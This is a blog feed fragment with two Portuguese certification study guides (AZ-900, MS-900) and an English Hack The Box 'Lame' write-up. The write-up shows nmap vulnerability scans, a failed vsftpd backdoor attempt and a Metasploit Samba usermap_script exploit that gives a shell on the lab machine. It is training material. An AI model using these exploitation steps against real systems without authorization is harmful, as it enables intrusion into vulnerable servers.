            <pubDate>Mon, 06 Sep 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/09/roadmap-para-az-900-pt-br/</guid>
            <description>Introdução O intuito desse post é ajudar os interessados em fazer a prova AZ-900 Microsoft 365 Fundamentals. Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.
A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, o foca é entender os conceitos do azure e de cada serviço. Ter uma noção básica do que cada serviço do azure faz é fundamental.</description>
            <content type="html"><![CDATA[
    <img src="/images/az-900/az.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introdução">Introdução</h2>
<p>O intuito desse post é ajudar os interessados em fazer a prova AZ-900 Microsoft 365 Fundamentals.
Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.</p>
<p>A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, o foca é entender os conceitos do azure e de cada serviço. Ter uma noção básica do que cada serviço do azure faz é fundamental.</p>
<p>Além disso essa prova é considerada uma prova de entrada para o mundo Azure, sendo assim após essa prova, você pode optar por seguir o caminho azure de infra ou de dev.</p>
<h2 id="sobre-a-prova">Sobre a prova</h2>



<blockquote>

Os candidatos a este exame devem ter conhecimentos básicos nos serviços em nuvem e como os serviços são provisionados com o Microsoft Azure.



<br>



<br>

O exame Azure Fundamentals é uma oportunidade para avaliar o
conhecimento dos candidatos nos conceitos de nuvem, serviços básicos do Azure, preços, SLA e ciclo de vida do Azure e os fundamentos de segurança, privacidade, conformidade e confiabilidade na nuvem.


<br>



<br>


Este exame foi desenvolvido para pessoas que estão iniciando no ambiente de soluções e serviços baseados em nuvem. Os candidatos devem ser capazes de demonstrar um conhecimento básico nos conceitos de nuvem, bem como serviços, cargas de trabalho, segurança, privacidade, preços e suporte do Azure. Além disso, devem estar familiarizados com os conceitos de rede, armazenamento, computação, suporte a aplicativos e desenvolvimento de aplicativos.
</blockquote>

<p>A prova possui 41 questões e é preciso ter 70% de acerto.</p>
<p>A prova custa em torno de 60 dólares, porém procure participar de eventos da Microsoft como o <a href="https://www.microsoft.com/en-us/trainingdays" target="_blank" >Microsoft Training Day </a> onde é possível ganhar vouchers para realizar a prova.</p>

    <img src="/images/az-900/preco.png"  class="center"  style="border-radius: 10px;"  />


<p>O exame pode ser agendado tanto presencial quanto online, eu fiz o exame de forma presencial depois de ter problemas com a realização online.</p>
<p>As questões são de múltipla escolha, verdadeiro ou falso e também questões de correlacionar. 
Um tipo de questão diferente nessa prova, no meu caso foram duas, é uma questão onde você deve clicar na área correspondente da ferramenta. A questão mostra um print de uma tela do Microsoft Azure com partes &ldquo;clicáveis&rdquo; e você deve clicar na área correta de acordo com a pergunta.</p>
<p>Minha prova foi realizada no dia 03/09/2021, idioma inglês.</p>
<h2 id="composição-da-prova">Composição da Prova</h2>
<ul>
<li>Descrever os conceitos do cloud (20-25%)</li>
<li>Descrever os principais serviços do Azure (15-20%</li>
<li>Descrever as principais soluções e ferramentas de administração no Azure (10-15%)</li>
<li>Descrever os recursos gerais de segurança e segurança de rede (10-15%)</li>
<li>Descrever recursos de identidade, governança, privacidade e conformidade (20-25%)</li>
<li>Descrever o administração de custos do Azure e Service Level Agreements (10-15%)</li>
</ul>
<p>O documento completo com a estrutura da prova pode ser encontrado <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE3VwUY" target="_blank" >aqui</a>.</p>
<h2 id="preparação">Preparação</h2>
<p>Na minha opinião existem duas formas de se preparar para essa prova: uma é com conteúdos gratuitos e outra com conteúdo pago.</p>
<h3 id="conteúdo-gratuito">Conteúdo Gratuito</h3>
<p>Na internet é possível encontrar diversas fontes de estudo gratuitas para essa prova.</p>
<p>Eu recomendo o canal <a href="https://www.youtube.com/channel/UCg8OCdG1yeiSPFDyqQDxHnw" target="_blank" >A guide to Cloud</a> além do conteúdo para az-900 ele possui outros vídeos para certificações da microsoft.</p>

    <img src="/images/az-900/guidetocloud.png"  class="center"  style="border-radius: 10px;"  />


<p>A playlist do curso é bem completa com todo conteúdo da prova:</p>


<iframe width="560" height="315" src="https://www.youtube.com/embed/UyaZWgkuQE8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


<p>Outra forma de preparação são os cursos gratuitos da <a href="https://www.linkedin.com/company/ka-solution/" target="_blank" >KaSolution</a>, eles estão sempre promovendo cursos aos sábados. Completos para várias formações Microsoft.
Infelizmente para esse método você vai precisar contar com a sorte de abrirem uma turma gratuita. 
Basta ficar de olho na rede social deles, o último AZ-900 foi no dia 28/08/2021.</p>

    <img src="/images/az-900/ka.png"  class="center"  style="border-radius: 10px;"  />


<p>Eu fiz o curso da Ka Solution para me preparar para essa prova. Inclusive eles fornecem certificado de conclusão:</p>

    <img src="/images/az-900/certificado.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="conteúdo-pago">Conteúdo Pago</h3>
<p>Como recomendação de conteúdo pago eu deixo o curso da <a href="https://cursos.alura.com.br" target="_blank" >Alura</a>, eu fiz a formação completa deles como uma revisão, já que eu tinha feito o curso gratuito da <a href="https://www.linkedin.com/company/ka-solution/" target="_blank" >KaSolution</a>.</p>
<p>No <a href="https://www.udemy.com" target="_blank" >Udemy</a> também é possível encontrar muitos cursos de preparação para az-900 com valores acessíveis.</p>
<p>Na <a href="https://www.kasolution.com.br/Home?pt=google" target="_blank" >KaSolution</a> além dos cursos gratuitos é possível comprar diversas formações para preparação de certificações diversas da Microsoft.</p>
<p>Além disso é possível comprar o livro oficial da microsoft para preparação, infelizmente para essa prova eu não comprei, devido o valor elevado aqui no Brasil. Entretanto eu conheço os livros de outras certificações da microsoft que tirei e eles são bem completos e recomendo muito quando é possível encontrar com preços acessíveis.</p>

    <img src="/images/az-900/book.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="simulados">Simulados</h2>
<p>Acredito que os simulados são uma preparação extra para prova, muitos não apoiam a ideia porém a própria microsoft vende os famosos brain dumps. Dentro da página de agendamento é possível encontrar um link para compra:</p>

    <img src="/images/az-900/exame.png"  class="center"  style="border-radius: 10px;"  />


<p>Esse eu realmente não indico a compra, nunca comprei devido o alto valor solicitado.</p>
<p>Uma opção gratuita para testar seu conhecimento com questões é o site: <a href="https://www.itexams.com" target="_blank" >IT Exams</a>, especificamente para o AZ-900 eles possuem um banco de dados com 244 questões.</p>

    <img src="/images/az-900/itexams.png"  class="center"  style="border-radius: 10px;"  />


<p>Outra forma porém paga, é comprar simulados preparatórios no Udemy, existem vários na plataforma. 
Eu recomendo esse <a href="https://www.udemy.com/course/az-900-5-practice-tests-on-ms-365-certification" target="_blank" >aqui</a>. As questões refletem a dinâmica da prova, sendo uma ótima maneira de treinar.</p>

    <img src="/images/az-900/udemy.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="tópicos-importantes">Tópicos importantes</h2>
<p>Esse item pode ser um pouco complicado, não existe o tópico mais importante! Porém aqui descrevo os tópicos que percebi na prova com mais frequência.</p>
<ul>
<li>
<p>Conceitos básicos de Nuvem</p>
<p>É fundamental saber o que é PaaS,Saas,Iaas. Algumas questões na minha prova informaram um serviço da Microsoft e pediam na resposta para identificar em qual tipo de serviço na nuvem ele se enquadrava. 
Também é fundamental saber a diferença entre CapEx e OpEx, Nuvem Pública e Privada.
Outro ponto aqui é saber quais serviços do Azure são aplicáveis em ambiente On-premise, algumas questões pegam nesse ponto, na minha prova por exemplo uma questão pedia para informar se o Azure Sentinel também tinha abrangência em ambiente on-premises e outra perguntou o mesmo porém para o serviço Azure Monitor.</p>
</li>
<li>
<p>Onde executar e onde encontrar informações:</p>
<p>Muitas questões perguntavam onde era possível encontrar a política de dados da Microsoft ou onde era possível gerar relatórios de desempenho, onde é possível ver os alertas de saúde do serviço. Você precisa saber onde cada informação dessa pode ser encontrada, por isso é fundamental saber o que cada página do Azure Portal faz.</p>
<p>Outro ponto importante aqui é como executar uma tarefa, muitas questões perguntavam qual o menu para abrir o Azure Shell ou se é possível criar máquinas virtuais de um celular android ou computador Mac. Outra questão mostrava uma tela de tipos de armazenamentos e perguntava qual era o ideal para utilização em VM&rsquo;s.</p>
</li>
<li>
<p>Conceitos de segurança:</p>
<p>Tive duas questões na minha prova que basicamente perguntavam a diferença entre NSGs, Azure Firewall e Application Firewall. Em duas questões tive como resposta o Azure Key Vault, ambas as questões descreveram formas diferentes de utilizar o serviço. Uma única questão perguntou sobre o Azure Sentinel, seguindo o padrão da maioria das questões a pergunta descrevia uma ação e era preciso dizer qual é o serviço.</p>
</li>
</ul>
<p>Como eu disse esses são só pontos em destaque que eu percebi que foram muito cobrados na minha prova, então não foque só nesses. Mas se você leu e sabe o que são todos esses itens e entende o que cada um deles faz, você provavelmente já tem uma boa base para prova.</p>
<h2 id="dia-da-prova">Dia da Prova</h2>
<p>Primeiramente eu havia marcado a prova para o dia 02/09/2021 de forma online com a PersonVue. 
Realizei o teste do ambiente com o software e deu tudo certo, esperei a hora da prova e fiz todo o procedimento inicial: enviar minha foto, foto do documento e foto do ambiente.</p>
<p>Na hora do exame de forma pontual o proctor me chamou via chamada de voz e iniciou a prova, porém aparecia um erro genérico <em>&ldquo;Hmmm Something it&rsquo;s wrong&rdquo;</em> e simplesmente não consegui iniciar a prova. 
Falei com o proctor que tentou me ajudar, mas sem sucesso. Repeti todo o processo umas cinco vezes e falei com cinco proctores diferente em cada uma delas e nenhum pode ajudar. 
Na quinta tentativa eu pedi o cancelamento do exame, já que a solução dada era sempre reiniciar a máquina.</p>
<p>Após cancelar o exame, por sorte consegui marcar presencial no dia seguinte 03/09/2021 no Instituto Infnet no Rio de Janeiro.</p>

    <img src="/images/az-900/badge.png"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/az-900/cert.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Lame - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/09/hack-the-box-lame-write-up/</link>
            <pubDate>Wed, 01 Sep 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/09/hack-the-box-lame-write-up/</guid>
            <description>Enumeration Initial scan:
└─$ sudo nmap -sS -Pn 10.10.10.3 [sudo] password for venomsnake: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 10:40 -03 Nmap scan report for 10.10.10.3 Host is up (0.17s latency). Not shown: 996 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 20.</description>
            <content type="html"><![CDATA[<p>
    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/lame/banner.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="enumeration">Enumeration</h2>
<p>Initial scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.3</span>
[sudo] password <span style="color:#66d9ef">for</span> venomsnake: 
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-09-01 10:40 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.3</span>
Host is up (<span style="color:#ae81ff">0.17</span>s latency).
Not shown: <span style="color:#ae81ff">996</span> filtered ports
PORT    STATE SERVICE
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp  open  ftp
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp  open  ssh
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp open  microsoft<span style="color:#f92672">-</span>ds

Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">20.61</span> seconds
</code></pre></div><p>Second nmap scan with <code>--script vuln</code> and <code>-A</code> only on the open ports:21,22,139 and 445.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.3</span> <span style="color:#f92672">-</span>A <span style="color:#f92672">--</span>script vuln <span style="color:#f92672">-</span>p21,<span style="color:#ae81ff">22</span>,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">445</span>
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-09-01 10:44 -03
</span><span style="color:#75715e"></span>Pre<span style="color:#f92672">-</span>scan script results:
<span style="color:#f92672">|</span> broadcast<span style="color:#f92672">-</span>avahi<span style="color:#f92672">-</span>dos: 
<span style="color:#f92672">|</span>   Discovered hosts:
<span style="color:#f92672">|</span>     <span style="color:#ae81ff">224.0.0.251</span>
<span style="color:#f92672">|</span>   After NULL UDP avahi packet DoS (CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1002</span>).
<span style="color:#f92672">|</span>_  Hosts are all up (not vulnerable).
Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.3</span>
Host is up (<span style="color:#ae81ff">0.26</span>s latency).

PORT    STATE SERVICE     VERSION
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp  open  ftp         vsftpd <span style="color:#ae81ff">2.3.4</span>
<span style="color:#f92672">|</span>_sslv2<span style="color:#f92672">-</span>drown: 
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp  open  ssh         OpenSSH <span style="color:#ae81ff">4.7</span>p1 Debian <span style="color:#ae81ff">8u</span>buntu1 (protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#f92672">|</span> vulners: 
<span style="color:#f92672">|</span>   cpe:<span style="color:#f92672">/</span>a:openbsd:openssh:<span style="color:#ae81ff">4.7</span>p1: 
<span style="color:#f92672">|</span>     	SECURITYVULNS:VULN:<span style="color:#ae81ff">8166</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/securityvulns/SECURITYVULNS:VULN:8166
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>OPENBSD<span style="color:#f92672">-</span>OPENSSH<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4478</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2010-4478/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>LINUXRPM<span style="color:#f92672">-</span>ELSA<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0855</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/LINUXRPM-ELSA-2008-0855/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4478</span>	<span style="color:#ae81ff">7.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2010-4478
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1657</span>	<span style="color:#ae81ff">6.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2008-1657
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	SSV:<span style="color:#ae81ff">60656</span>	<span style="color:#ae81ff">5.0</span>	https:<span style="color:#75715e">//vulners.com/seebug/SSV:60656	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">15906</span>	<span style="color:#ae81ff">5.0</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2017-15906
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5107</span>	<span style="color:#ae81ff">5.0</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2010-5107
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>SUSE<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2011-5000/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>ORACLE<span style="color:#f92672">-</span>SOLARIS<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0814</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2012-0814/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>GENTOO<span style="color:#f92672">-</span>LINUX<span style="color:#f92672">-</span>CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2011-5000/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>AMAZON<span style="color:#f92672">-</span>LINUX<span style="color:#f92672">-</span>AMI<span style="color:#f92672">-</span>ALAS<span style="color:#f92672">-</span><span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">99</span><span style="color:#f92672">/</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-ALAS-2012-99/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2012</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0814</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2012-0814
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5000</span>	<span style="color:#ae81ff">3.5</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2011-5000
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">5161</span>	<span style="color:#ae81ff">2.6</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2008-5161
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4327</span>	<span style="color:#ae81ff">2.1</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2011-4327
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	MSF:ILITIES<span style="color:#f92672">/</span>SSH<span style="color:#f92672">-</span>OPENSSH<span style="color:#f92672">-</span>X11USELOCALHOST<span style="color:#f92672">-</span>X11<span style="color:#f92672">-</span>FORWARDING<span style="color:#f92672">-</span>SESSION<span style="color:#f92672">-</span>HIJACK<span style="color:#f92672">/</span>	<span style="color:#ae81ff">1.2</span>	https:<span style="color:#75715e">//vulners.com/metasploit/MSF:ILITIES/SSH-OPENSSH-X11USELOCALHOST-X11-FORWARDING-SESSION-HIJACK/	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2008</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3259</span>	<span style="color:#ae81ff">1.2</span>	https:<span style="color:#75715e">//vulners.com/cve/CVE-2008-3259
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>     	SECURITYVULNS:VULN:<span style="color:#ae81ff">9455</span>	<span style="color:#ae81ff">0.0</span>	https:<span style="color:#75715e">//vulners.com/securityvulns/SECURITYVULNS:VULN:9455
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>_    	<span style="color:#ae81ff">1337</span>DAY<span style="color:#f92672">-</span>ID<span style="color:#f92672">-</span><span style="color:#ae81ff">20909</span>	<span style="color:#ae81ff">0.0</span>	https:<span style="color:#75715e">//vulners.com/zdt/1337DAY-ID-20909	*EXPLOIT*
</span><span style="color:#75715e"></span><span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn Samba smbd <span style="color:#ae81ff">3.</span>X <span style="color:#f92672">-</span> <span style="color:#ae81ff">4.</span>X (workgroup: WORKGROUP)
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp open  netbios<span style="color:#f92672">-</span>ssn Samba smbd <span style="color:#ae81ff">3.</span>X <span style="color:#f92672">-</span> <span style="color:#ae81ff">4.</span>X (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: DD<span style="color:#f92672">-</span>WRT v24<span style="color:#f92672">-</span>sp1 (Linux <span style="color:#ae81ff">2.4.36</span>) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), OpenWrt White Russian <span style="color:#ae81ff">0.9</span> (Linux <span style="color:#ae81ff">2.4.30</span>) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Arris TG862G<span style="color:#f92672">/</span>CT cable modem (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), D<span style="color:#f92672">-</span>Link DAP<span style="color:#f92672">-</span><span style="color:#ae81ff">1522</span> WAP, or Xerox WorkCentre Pro <span style="color:#ae81ff">245</span> or <span style="color:#ae81ff">6556</span> printer (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Dell Integrated Remote Access Controller (iDRAC6) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linksys WET54GS5 WAP, Tranzeo TR<span style="color:#f92672">-</span>CPQ<span style="color:#f92672">-</span><span style="color:#ae81ff">19f</span> WAP, or Xerox WorkCentre Pro <span style="color:#ae81ff">265</span> printer (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.4.21</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2.4.31</span> (likely embedded) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.4.27</span> (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Citrix XenServer <span style="color:#ae81ff">5.5</span> (Linux <span style="color:#ae81ff">2.6.18</span>) (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>), Linux <span style="color:#ae81ff">2.6.22</span> (<span style="color:#ae81ff">92</span><span style="color:#f92672">%</span>)
No exact OS matches <span style="color:#66d9ef">for</span> host (test conditions non<span style="color:#f92672">-</span>ideal).
Network Distance: <span style="color:#ae81ff">2</span> hops
Service Info: OSs: Unix, Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel

Host script results:
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">054</span><span style="color:#f92672">:</span> false
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">061</span><span style="color:#f92672">:</span> false
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>regsvc<span style="color:#f92672">-</span>dos: ERROR: Script execution failed (use <span style="color:#f92672">-</span>d to debug)

TRACEROUTE (using port <span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp)
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">254.52</span> ms <span style="color:#ae81ff">10.10.16.1</span>
<span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">254.65</span> ms <span style="color:#ae81ff">10.10.10.3</span>

OS and Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">190.31</span> seconds


</code></pre></div><p>We got the following results:</p>
<ul>
<li>Port 21 — Running FTP service of version 2.3.4</li>
<li>Port 22 — Running SSH service of version OpenSSH 4.7p1</li>
<li>Port 139,445 — Running SMB service of version Samba 3.0.20-Debia</li>
</ul>
<p>Two potential starting points: FTP and SMB. 
Now we need to enumerate these services.</p>
<h3 id="ftp">FTP</h3>
<p>Trying anonymous connect to FTP:</p>

    <img src="/images/htb/lame/ftp.png"  class="center"  style="border-radius: 10px;"  />


<p>The connection is working but the directory is empty.</p>
<p>vsftpd 2.3.4 is a famously backdoored FTP server, but the exploit does not work in this host. 
Fail with exploit/unix/ftp/vsftpd_234_backdoor.</p>
<h3 id="smb">SMB</h3>
<p>Since we can&rsquo;t go with the ftp exploit, let&rsquo;s check the smb.</p>
<p>Trying anonymous connect:</p>

    <img src="/images/htb/lame/smb.png"  class="center"  style="border-radius: 10px;"  />


<p>This server allows anonymous connection, so we could try to exploit it over the smb.</p>
<h2 id="exploitation">Exploitation</h2>
<p>We know the samba version:</p>

    <img src="/images/htb/lame/smbversion.png"  class="center"  style="border-radius: 10px;"  />


<p>Let&rsquo;s google for some exploits:</p>

    <img src="/images/htb/lame/exploit.png"  class="center"  style="border-radius: 10px;"  />


<p>The <a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/" target="_blank" >exploit</a><code>username map script</code>  it&rsquo;s a good candidate for the exploitation.</p>
<p>Using the <code>msfconsole</code> we need to set the <code>multi/samba/usermap_script</code> and set the LHOST and RHOST options:</p>

    <img src="/images/htb/lame/access.png"  class="center"  style="border-radius: 10px;"  />


<p>We have a shell!</p>
<h2 id="flags">Flags</h2>
<p>Now with shell access, we could check some folders and files to find the two flags.</p>

    <img src="/images/htb/lame/files.png"  class="center"  style="border-radius: 10px;"  />




<br>


    <img src="/images/htb/lame/pwned.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>RoadMap para MS-900 (Pt-br)</title>
            <link>https://nmmorette.github.io/posts/2021/08/roadmap-para-ms-900-pt-br/</link>
            <pubDate>Mon, 30 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/08/roadmap-para-ms-900-pt-br/</guid>
            <description>Introdução O intuito desse post é ajudar os interessados em fazer a prova MS-900 Microsoft 365 Fundamentals. Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.
A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, além disso é uma certificação de &amp;ldquo;entrada&amp;rdquo; para Microsoft 365. Vai te ajudar a conhecer a tecnologia ou provar seus conhecimentos.</description>
            <content type="html"><![CDATA[
    <img src="/images/ms-900/fundamental.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="introdução">Introdução</h2>
<p>O intuito desse post é ajudar os interessados em fazer a prova MS-900 Microsoft 365 Fundamentals.
Nesse post vou falar um pouco sobre a prova e sobre o meu plano de estudos para aprovação.</p>
<p>A prova tem nível fundamental ou seja é uma prova baseada em conceitos e não há prática, além disso é uma certificação de &ldquo;entrada&rdquo; para Microsoft 365. Vai te ajudar a conhecer a tecnologia ou provar seus conhecimentos.</p>
